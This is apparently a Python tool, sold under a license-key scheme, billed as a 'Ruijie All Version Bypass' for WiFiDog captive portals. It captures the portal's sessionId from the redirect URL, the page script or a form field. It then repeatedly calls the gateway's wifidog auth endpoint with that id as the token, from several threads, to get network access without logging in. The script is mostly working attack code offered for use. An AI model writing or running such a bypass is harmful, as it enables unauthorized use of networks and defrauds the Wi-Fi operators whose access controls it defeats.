#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import urllib3
import time
import threading
import logging
import random
import os
import sys
import json
import hashlib
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime, date, timedelta

# SSL Warning များကို ပိတ်ထားခြင်း
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM (Hacker UI)
# ===============================
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
RESET = "\033[0m"

# ===============================
# GITHUB KEY SYSTEM CONFIG
# ===============================
# GitHub Raw Link (key.txt ဖိုင်ရှိရာ လိပ်စာ)
GITHUB_KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

LOCAL_KEYS_FILE = os.path.expanduser("~/.moe_yu_approved_keys.txt")
KEY_STORAGE_FILE = os.path.expanduser("~/.moe_yu_device_key.txt")
LICENSE_INFO_FILE = os.path.expanduser("~/.moe_yu_license_info.txt")

# ===============================
# LICENSE MANAGEMENT
# ===============================
def save_license_info(expiry_date_str):
    data = {"expiry": expiry_date_str, "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "valid": True}
    try:
        with open(LICENSE_INFO_FILE, 'w') as f:
            json.dump(data, f)
        return True
    except: return False

def load_license_info():
    if os.path.exists(LICENSE_INFO_FILE):
        try:
            with open(LICENSE_INFO_FILE, 'r') as f: return json.load(f)
        except: pass
    return None

def is_license_valid_offline(expiry_date_str):
    try:
        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
        return date.today() <= expiry_date
    except: return False

# ===============================
# SYSTEM KEY GENERATOR
# ===============================
def get_stable_system_key():
    if os.path.exists(KEY_STORAGE_FILE):
        try:
            with open(KEY_STORAGE_FILE, 'r') as f:
                saved_key = f.read().strip()
                if saved_key: return saved_key
        except: pass
    
    try:
        import uuid
        stable_key = hashlib.md5(f"DEVICE_{uuid.getnode()}".encode()).hexdigest()[:16]
    except:
        stable_key = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16))
    
    try:
        with open(KEY_STORAGE_FILE, 'w') as f: f.write(stable_key)
    except: pass
    return stable_key

def fetch_authorized_keys():
    keys_data = {}
    try:
        response = requests.get(GITHUB_KEY_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line:
                    parts = line.split(',') 
                    if len(parts) >= 1:
                        key = parts[0].strip()
                        expiry = parts[2].strip() if len(parts) > 2 else "2099-12-31"
                        keys_data[key] = expiry
            try:
                with open(LOCAL_KEYS_FILE, 'w') as f:
                    for k, e in keys_data.items(): f.write(f"{k},{e}\n")
            except: pass
            return keys_data
    except: pass
    
    if os.path.exists(LOCAL_KEYS_FILE):
        try:
            with open(LOCAL_KEYS_FILE, 'r') as f:
                for line in f:
                    p = line.strip().split(',')
                    if len(p) >= 1: keys_data[p[0]] = p[1] if len(p) > 1 else ""
        except: pass
    return keys_data

def check_approval():
    print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
    print(f"║          MOE YU BYPASS - GITHUB EDITION          ║")
    print(f"╚══════════════════════════════════════════════════╝{RESET}")
    
    system_key = get_stable_system_key()
    print(f"{WHITE}[*] Your System Key: {GREEN}{system_key}{RESET}")
    
    saved = load_license_info()
    if saved and is_license_valid_offline(saved['expiry']):
        print(f"{GREEN}[✓] LICENSE ACTIVE (Offline Mode){RESET}")
        return True

    print(f"{CYAN}[*] Checking GitHub database...{RESET}")
    authorized_keys = fetch_authorized_keys()
    
    if system_key in authorized_keys:
        expiry_str = authorized_keys[system_key]
        if is_license_valid_offline(expiry_str):
            print(f"{GREEN}[✓] KEY APPROVED! Expires: {expiry_str}{RESET}")
            save_license_info(expiry_str)
            return True
        else:
            print(f"{RED}[✗] KEY EXPIRED ON {expiry_str}{RESET}")
            return False
    else:
        print(f"\n{RED}[✗] KEY NOT APPROVED{RESET}")
        print(f"{YELLOW}Add '{system_key}' to your GitHub key.txt{RESET}")
        return False

# ===============================
# BYPASS ENGINE (SID Logic အသစ်ပါဝင်သည်)
# ===============================
STOP_EVENT = threading.Event()

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not STOP_EVENT.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active", end="\r")
        except: break
        time.sleep(random.uniform(0.3, 0.8))

def start_process():
    banner = f"{MAGENTA}\nRuijie All Version Bypass\nMoe Yu Special Edition\n{RESET}"
    print(banner)
    logging.info(f"{CYAN}Initializing Engine...{RESET}")

    while not STOP_EVENT.is_set():
        session = requests.Session()
        try:
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
            if r.url == "http://connectivitycheck.gstatic.com/generate_204":
                time.sleep(5)
                continue
            
            portal_url = r.url
            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
            
            r1 = session.get(portal_url, verify=False, timeout=10)
            
            # --- SID Extraction အဆင့်မြှင့်တင်မှုများ ---
            sid = parse_qs(urlparse(r1.url).query).get('sessionId', [None])[0]
            
            if not sid:
                # JavaScript ထဲမှ ရှာခြင်း
                sid_match = re.search(r'sessionId\s*[:=]\s*["\']([^"\']+)["\']', r1.text)
                if sid_match: sid = sid_match.group(1)
            
            if not sid:
                # URL string ထဲတွင် တိုက်ရိုက်ရှာခြင်း
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r1.url)
                if sid_match: sid = sid_match.group(1)
            
            if not sid:
                # HTML input field များထဲတွင် ရှာခြင်း
                sid_match = re.search(r'name="sessionId" value="([^"]+)"', r1.text)
                if sid_match: sid = sid_match.group(1)
            # -------------------------------------

            if sid:
                print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
                parsed = urlparse(portal_url)
                gw_addr = parse_qs(parsed.query).get('gw_address', ['192.168.60.1'])[0]
                gw_port = parse_qs(parsed.query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                print(f"{MAGENTA}[*] Launching Turbo Threads...{RESET}")
                for _ in range(3):
                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
            else:
                print(f"{RED}[!] Session ID Not Found - Please open login page in browser{RESET}")
            
            time.sleep(10)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--key":
            print(f"\n{GREEN}Your Key: {get_stable_system_key()}{RESET}")
            sys.exit(0)
        elif sys.argv[1] == "--reset":
            for f in [KEY_STORAGE_FILE, LICENSE_INFO_FILE, LOCAL_KEYS_FILE]:
                if os.path.exists(f): os.remove(f)
            print(f"{GREEN}All data cleared!{RESET}")
            sys.exit(0)

    if check_approval():
        try: start_process()
        except KeyboardInterrupt: STOP_EVENT.set()
